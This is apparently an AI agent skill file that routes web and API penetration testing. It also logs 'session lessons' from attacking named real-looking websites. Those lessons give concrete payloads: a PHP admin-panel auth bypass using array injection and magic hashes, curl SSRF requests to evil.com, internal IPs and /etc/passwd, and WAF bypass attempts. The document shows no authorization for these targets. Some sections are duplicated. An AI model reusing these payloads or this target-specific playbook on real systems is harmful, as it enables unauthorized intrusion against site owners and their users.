---
name: hack
description: >-
  Entry P0 primary router for HackSkills. Use when the task involves web
  application testing, API security assessment, recon, vulnerability triage,
  exploit path planning, or choosing the right next category skill before any
  deep topic skill.
---

# HACKING SKILLS / HackSkills

## Overview

This is a top-level routing skill for **bug bounty, web security, API security, and authorized penetration testing**.

Its core role is not to replace all specialized techniques, but to help the agent:

1. First determine the testing phase (Recon / Validation / Privilege Escalation / Chain building)
2. Then select the correct vulnerability category
3. Avoid relying only on baseline model memory; prefer structured methodology
4. Prioritize boundary conditions AI often misses but that matter in real engagements

## Trust Model

- This knowledge base emphasizes content safety and auditability.
- Use this only within **authorized targets**, **legitimate research**, **defensive validation**, and **bug-bounty-approved rules**.
- Do not use these techniques for unauthorized attacks.

## When to Use This Skill

Use this skill first in the following scenarios:

- You just received a new bug bounty target and do not know where to start
- You need to decide whether to load XSS / SQLi / SSRF / IDOR / JWT / API tracks first
- You want the agent to perform Web/API security testing with a more stable methodology
- You need to route scattered findings to the right attack surface
- You want AI to miss fewer critical test points in security work

## Operating Model

### Step 1: Start with Recon and context validation

Collect first:

- Target type: classic web, REST API, mobile backend, admin panel, payment flow, file upload, GraphQL
- Identity and permission model: anonymous, regular user, admin, multi-tenant
- Input locations: URL, query parameters, JSON, headers, cookies, filenames, imported files, templates, reflection points
- Output locations: HTML, attributes, JS, PDF, email, logs, background tasks, mobile endpoints

### Step 2: Route by observed behavior

| Signal | Priority direction |
|---|---|
| Input reflects into HTML / JS | XSS / SSTI |
| Server actively fetches URL / hostname | SSRF |
| Accepts XML / Office / SVG | XXE |
| Path, filename, or download endpoint is controllable | Path Traversal / LFI |
| Many object IDs appear in APIs | IDOR / BOLA / BFLA |
| Login, reset password, 2FA, sessions | Auth Bypass / JWT / OAuth |
| Multi-step transactions, coupons, pricing, inventory | Business Logic |
| MongoDB / JSON query syntax exposure | NoSQL Injection |
| CLI tools, image processing, importers | Command Injection |
| HTTP parsing anomalies / front-back framing mismatch | Request Smuggling |
| Node.js JSON handling / controllable `__proto__` | Prototype Pollution |
| PHP weak comparison / 0e hash / loose conditions | Type Juggling |
| Repeated parameter names / WAF-app parsing mismatch | HTTP Parameter Pollution |
| One-time operations (coupon/inventory/reset) | Race Condition |
| XML/XSLT template processing | XSLT Injection |
| Accessible .git/.svn/.env paths | Insecure SCM |
| CSV/Excel export features | CSV Formula Injection |
| WebSocket protocol upgrades | WebSocket Security |
| Internal package names / supply-chain inventory | Dependency Confusion |

### Step 3: Use the most likely-hit testing order

1. Recon / Methodology
2. API Security / Auth / IDOR
3. XSS / SQLi / SSRF / SSTI / XXE
4. Business Logic / Race Condition
5. Chained exploits and privilege-escalation paths

## Core Skill Map

If you have the full repository, prioritize using these topic documents together:

## Session-Specific Lessons (2026-08-31)

### Anti-Hang Gia / Upstream Proxy Pattern

Common target pattern for Vietnamese anti-counterfeit systems:
```
Frontend: nghimmo.com (PHP form-based verify)
Backend API: /api/index.php?action=verify (POST JSON)
Upstream: fw.bestten.cn (IIS 8.5, Chinese interface)
```

**Exploitation pattern:**
1. Frontend API (`nghimmo.com/api/`) typically wraps remote services
2. Test if API proxies to upstream before validating input
3. SSRF via code parameter → inject `evil.com` as "code" triggers external request
4. WAF blocks direct `/etc/passwd` attempts → path traversal blocked by one-shot protection

**Auth bypass via admin panel:**
- Form: `admin.php` with `mat_khau` POST field
- GET method bypass works initially but form still renders (false positive)
- **Real bypass**: Use array injection `mat_khau[]=val1&mat_khau[]=val2` — may trigger multi-value validation bugs in poorly implemented auth
- **Magic hash payloads** (PHP type juggling): Try QNKCDZO, 240610708, s878926199a, etc.
- **Never use**: `--data-urlencode` — always use raw POST for special characters like `' OR 1=1`

**WAF Behavior Detection:**
- 403 = blocked (Cloudflare/WAF)
- 404 = resource not found
- 200 + "không tồn tại" = normal response (NOT a vulnerability)
- Look for error message differences: "Mật khẩu không đúng" vs "Dữ liệu mã số" vs "API không tồn tại"

### SSRF via Code Field Testing

When API takes "code"/"id"/"reference" params:
```python
# Direct proxy test
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"http://evil.com"}'

# Internal network access  
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"http://192.168.1.1/admin.php"}'

# Filter bypass (strip non-digits)
curl -X POST 'https://target.com/api' \
     -H 'Content-Type: application/json' \
     -d '{"code":"../etc/passwd"}'  # Will return filter error, confirming sanitization
```

**Key insight**: If filter strips non-digits, SQLi via that field is impossible unless there's an oracle (timing/error-based).

---

## Core Skill Map

If you have the full repository, prioritize using these topic documents together:

- [Recon and Methodology](../recon-and-methodology/SKILL.md)
- [XSS Cross Site Scripting](../xss-cross-site-scripting/SKILL.md)
- [SQLi SQL Injection](../sqli-sql-injection/SKILL.md)
- [SSRF Server Side Request Forgery](../ssrf-server-side-request-forgery/SKILL.md)
- [XXE XML External Entity](../xxe-xml-external-entity/SKILL.md)
- [SSTI Server Side Template Injection](../ssti-server-side-template-injection/SKILL.md)
- [IDOR Broken Object Authorization](../idor-broken-object-authorization/SKILL.md)
- [CMDi Command Injection](../cmdi-command-injection/SKILL.md)
- [Path Traversal LFI](../path-traversal-lfi/SKILL.md)
- [CSRF Cross Site Request Forgery](../csrf-cross-site-request-forgery/SKILL.md)
- [API Security Router](../api-sec/SKILL.md)
- [JWT OAuth Token Attacks](../jwt-oauth-token-attacks/SKILL.md)
- [OAuth OIDC Misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- [CORS Cross Origin Misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md)
- [SAML SSO Assertion Attacks](../saml-sso-assertion-attacks/SKILL.md)
- [Authentication Bypass](../authbypass-authentication-flaws/SKILL.md)
- [Business Logic Vulnerabilities](../business-logic-vulnerabilities/SKILL.md)
- [Upload Insecure Files](../upload-insecure-files/SKILL.md)
- [NoSQL Injection](../nosql-injection/SKILL.md)
- [Request Smuggling](../request-smuggling/SKILL.md)
- [Prototype Pollution](../prototype-pollution/SKILL.md)
- [Type Juggling (PHP)](../type-juggling/SKILL.md)
- [HTTP Parameter Pollution](../http-parameter-pollution/SKILL.md)
- [Race Condition](../race-condition/SKILL.md)
- [XSLT Injection](../xslt-injection/SKILL.md)
- [Insecure Source Code Management](../insecure-source-code-management/SKILL.md)
- [CSV Formula Injection](../csv-formula-injection/SKILL.md)
- [WebSocket Security](../websocket-security/SKILL.md)
- [Dependency Confusion](../dependency-confusion/SKILL.md)
- [Ghost Bits Cast Attack](../ghost-bits-cast-attack/SKILL.md)

Previously separate mini skills such as payload-selection and brute-selection were merged back into their main skills to avoid router overload and selection noise.

**Session-specific references:**
- [Kubernetes Internal Endpoint Leakage](./references/kubernetes-beacon-leak.md) — Client-side beacon exploitation patterns
- [Next.js SPA + AMP Dual Landing Recon](./references/nextjs-spa-amp-recon.md) — Modern web app architecture discovery and assessment

## Session-Specific Lessons (2026-08-31)

### Kubernetes Internal Endpoint Leakage via Client-Side Beacons

When analyzing JavaScript bundles, look for **network telemetry beacons** that POST to internal services:

```javascript
navigator.sendBeacon("http://unleash.unleash.svc.cluster.local:4242/api",
  JSON.stringify({type:"html_render",page:page,hostname:location.hostname,...}))
```

**What this reveals:**
- Target runs on Kubernetes infrastructure
- Internal service endpoints are embedded in public JS
- Client-side code may attempt to reach cluster-internal addresses

**Exploitation angle:**
- Can beacon URL be spoofed/redirected to other internal services?
- Does the client send credentials/tokens with beacon requests?
- Can `trace_id` or session data in beacon be manipulated?

**Recon command pattern:**
```python
# Extract ALL URLs from JS bundles including internal IPs/domains
for f in *.js; do grep -oE '(https?://[^"'"'"' >)]+|"[^"]*api[^"]*")' "$f" | sort -u; done
```

### SPA + AMP Dual Landing Pattern

Modern applications often use:
1. **Main landing**: Next.js SPA with dynamic routing (`/register` → 404, not real page)
2. **AMP redirect**: Static AMP page at different subdomain (`masuk.festivalsuperjp.com`)
3. **Backend API**: Fully protected behind WAF/API gateway (`api.vsuperadmin.com` → all 403)

**Testing approach:**
- Don't assume `/register` endpoint exists — check if it's SPA-only routing
- Find the "real" registration flow via social media channels (Telegram/Facebook groups)
- Backend APIs are often fully blocked to unauthenticated access — requires valid JWT
- Look for third-party script integration points (PushAlert, Google Tag Manager, etc.)

### Cloudflare WAF + nginx 403 Defense Chain

Common defense stack:
```
Cloudflare WAF → Next.js SPA → nginx 403 (backend API)
```

**Bypass attempts that typically fail:**
- Path normalization tricks (`/auth/login/..;/auth/login`)
- Header manipulation (`X-Original-URL`, `X-Rewrite-URL`)
- Method tampering (`POST /auth/login` when only GET allowed)

**Key insight:** The backend is properly segmented — no direct public access without valid session token. Requires authentication bypass or account creation before authenticated testing.

**Pitfall:** Scanner finds 403 status ≠ vulnerable. Modern apps return 403 for all protected routes. Body content tells the story ("nginx" vs app-specific error message).

## High-Value Expert Intuitions

These are points many baseline models miss, but they are frequently effective in real bug bounty work:

1. **The same filtering logic is often reused across multiple pages**: if one point is bypassable, similar pages usually are too.
2. **Parameter names are an attack surface too**: WAFs often inspect values but not names.
3. **Second-order vulnerabilities are common**: safe at storage time does not mean safe when later read into a dangerous context.
4. **BOLA is fundamentally 'authenticated but unauthorized'**: replaying with account A/B switching is critical.
5. **Older API versions are most likely to miss patches**: fixing v2 does not mean v1 was retired.
6. **Business-logic vulnerabilities often bring highest impact**: scanners miss them and they persist longer.
7. **Race conditions should prioritize one-time actions**: coupon redemption, claims, resets, invites, trials, inventory deduction.
8. **For JWT attacks, check key and algorithm context first**: do not blindly spray payloads; verify `alg`, `kid`, JWKS, and key source first.

## Suggested Prompts

Use this skill as a router to make the agent clarify phase and goal first:

- "First, plan the testing route for this target using bug bounty methodology.
- "This is a REST API; prioritize BOLA, BFLA, Mass Assignment, and JWT angles.
- "This parameter triggers server-side requests; list key validation points from an SSRF perspective.
- "This feature is a payment/coupon/inventory flow; prioritize business logic and race-condition analysis.
- "I only see login and password-reset flows; analyze via Auth Bypass + OAuth/JWT + CSRF.

## Installation Notes

Recommended skill name:

- `hack`

Recommended search keywords:

- `HackSkills`
- `HACKING SKILLS`
- `bug bounty`
- `bug bounty hunter`

## Guidelines

- Prioritize routing by target type and observed behavior, not random payload enumeration.
- When payloads are needed, prefer quick-start / first-pass samples in the corresponding main skill instead of adding another intermediate router.
- Prioritize reusable filters, shared components, and cross-page reproduction paths.
- Confirm authentication, authorization, and version boundaries before deeper exploitation.
- Preserve explainable, auditable, reproducible testing processes.
- When full repository context is available, return to topic documents for finer exploitation details.
